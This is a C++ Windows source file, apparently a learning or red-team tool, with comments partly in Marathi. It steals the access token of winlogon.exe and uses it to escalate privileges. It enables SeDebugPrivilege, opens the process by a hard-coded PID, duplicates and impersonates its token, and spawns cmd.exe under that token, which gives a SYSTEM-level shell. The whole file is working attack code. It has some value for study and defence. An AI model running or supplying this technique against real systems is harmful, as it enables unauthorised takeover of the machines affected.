#include<Windows.h>
#include <stdio.h>
#include <iostream>
#pragma comment(lib, "advapi32.lib")

void EnablePrivileges(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	//Handle hToken // Handle where the stolen access token will be stored.
	//LPCTSTR PrivName // Privilege name to enable/disable
	//BOOL EnablePrivilege //Enable/Disable privilege

	TOKEN_PRIVILEGES tp;
	LUID luid;  //A 64-bit value that is guaranteed to be unique on the operating system that generated it until the system is restarted.

	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))  //The LookupPrivilegeValue function retrieves the locally unique identifier (LUID) used on a specified system to locally represent the specified privilege name.
	{
		printf("LookupPrivilegeValue() Failed :- ");//lpszPrivilege madhe je konti string asel tyacha luid return karel haan function.
		printf("Error code : %d", GetLastError());
		exit(-1);
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)// jrr user ne enable karayla lavlay trr enable karne...
	{
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	}
	else
	{
		tp.Privileges[0].Attributes = 0;
	}

	//The AdjustTokenPrivileges function enables or disables privileges in the specified access token. 
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges() Failed :- ");
	}
	printf("Privileges enables \n");
}

int main()
{
	DWORD pid_to_impersonate = 964; //winlogon exe
	HANDLE TokenHandle = NULL;
	HANDLE DuplicateTokenHandle = NULL;	STARTUPINFO startupinfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupinfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupinfo.cb = sizeof(STARTUPINFO);

	HANDLE CurrentTokenHandle = NULL;

	printf("PID :- %d\n", pid_to_impersonate);
	//TOKEN_ADJUST_PRIVILEGES	Required to enable or disable the privileges in an access token.
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &CurrentTokenHandle);
	if (!getCurrentToken)
	{
		printf("Couldnt retrive current process token :- \n");
		printf("Error Code:- %d", GetLastError());
	}

	EnablePrivileges(CurrentTokenHandle,SE_DEBUG_NAME,TRUE);

	HANDLE rProc = OpenProcess(PROCESS_QUERY_INFORMATION,TRUE,pid_to_impersonate);
	if (rProc == NULL)
	{
		printf("OpenProcess() Failed :-\n");
		std::cout << "Error code : " << GetLastError() << std::endl;
		return -1;
	}
	else
	{
		printf("Open Process Success!!\n");
	}

	BOOL rToken =OpenProcessToken(rProc,TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY|TOKEN_QUERY,&TokenHandle);
	if (!rToken)
	{
		printf("OpenProcessToken() Failed:-\n");
		std::cout << "Error code : " << GetLastError() << std::endl;
		return -1;
		//printf("Error code:- %d\n",GetLastError());
	}

	//A handle to a primary or impersonation access token that represents a logged - on user.
	BOOL ImpersonateUser = ImpersonateLoggedOnUser(TokenHandle);
	// act like a loged on user
	if (!ImpersonateUser)
	{
		printf("ImpersonateLoggedOnUser() Failed\n");
		printf("Error Code : %d\n", GetLastError());
	}
	//The DuplicateTokenEx function creates a new access token that duplicates an existing token.
	if (!DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &DuplicateTokenHandle))
	{
		printf("DuplicateTokenEx() Failed\n");
		printf("Error Code : %d\n", GetLastError());
	}

	if (!CreateProcessWithTokenW(DuplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupinfo, &processInformation))
	{
		printf("CreateProcessWithTokenW() Failed\n");
		printf("Error Code : %d\n", GetLastError());
	}
	return 0;
}